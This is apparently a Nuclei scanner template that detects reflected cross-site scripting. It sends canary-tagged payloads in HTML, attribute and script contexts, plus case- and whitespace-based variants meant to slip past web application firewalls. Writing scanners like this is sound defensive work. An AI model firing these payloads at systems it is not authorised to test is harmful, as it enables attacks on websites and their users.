id: reflected-xss-advanced-detection

info:
  name: Reflected XSS - Advanced Multi-Context Detection
  author: achraf-chehboun
  severity: high
  description: |
    Advanced reflected XSS detection using context-aware payloads designed to bypass
    common WAF rules and output encoding. Tests injection in HTML body, attribute context,
    JavaScript context, and URL context. Uses canary-based detection to confirm reflection
    before testing executable payloads. Non-exploitative — payloads trigger no actual
    JavaScript execution in the detection phase, only tests for unsafe reflection.
  reference:
    - https://owasp.org/Top10/A03_2021-Injection/
    - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  metadata:
    max-request: 12
  tags: owasp-top10,xss,reflected,detection-only

variables:
  canary: "ac7r4f{{randstr}}"

http:
  # Phase 1: Canary reflection test — confirm input is reflected before XSS probing
  - raw:
      - |
        GET /?q={{canary}} HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: word
        name: canary-reflected
        words:
          - "{{canary}}"
        part: body
        internal: true

  # Phase 2: HTML context — tag injection
  - raw:
      - |
        GET /?q={{canary}}<img%20src=x%20onerror=alert(1)> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?q={{canary}}<svg%20onload=alert(1)> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?q={{canary}}<details%20open%20ontoggle=alert(1)> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: html-tag-injection
        dsl:
          - 'status_code_1 == 200 && contains(body_1, "<img src=x onerror=alert(1)>")'
          - 'status_code_2 == 200 && contains(body_2, "<svg onload=alert(1)>")'
          - 'status_code_3 == 200 && contains(body_3, "<details open ontoggle=alert(1)>")'
        condition: or

  # Phase 3: Attribute context breakout
  - raw:
      - |
        GET /?q={{canary}}"%20onfocus="alert(1)"%20autofocus=" HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?q={{canary}}'%20onmouseover='alert(1)' HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: attribute-breakout
        dsl:
          - 'contains(body_1, "onfocus=\"alert(1)\"") || contains(body_1, "onfocus=alert(1)")'
          - 'contains(body_2, "onmouseover=''alert(1)''") || contains(body_2, "onmouseover=alert(1)")'
        condition: or

  # Phase 4: JavaScript context breakout
  - raw:
      - |
        GET /?q={{canary}}';alert(1);// HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?q={{canary}}</script><script>alert(1)</script> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: js-context-breakout
        dsl:
          - 'contains(body_1, "{{canary}}'';alert(1);//")'
          - 'contains(body_2, "</script><script>alert(1)</script>")'
        condition: or

  # Phase 5: WAF bypass payloads — encoding and obfuscation
  - raw:
      - |
        GET /?q={{canary}}<ScRiPt>alert(1)</sCrIpT> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?q={{canary}}<img/src=x%0Aonerror=alert(1)> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?q={{canary}}<svg/onload=alert(1)> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: waf-bypass-reflected
        dsl:
          - 'contains(body_1, "<ScRiPt>alert(1)</sCrIpT>")'
          - 'contains(body_2, "onerror=alert(1)") && contains(body_2, "<img")'
          - 'contains(body_3, "<svg/onload=alert(1)>")'
        condition: or

    extractors:
      - type: regex
        name: reflected-payload-context
        group: 0
        regex:
          - '(?i)(<[^>]*(?:onerror|onload|onfocus|onmouseover|ontoggle)[^>]*>)'
          - '(?i)(<script[^>]*>[^<]*</script>)'
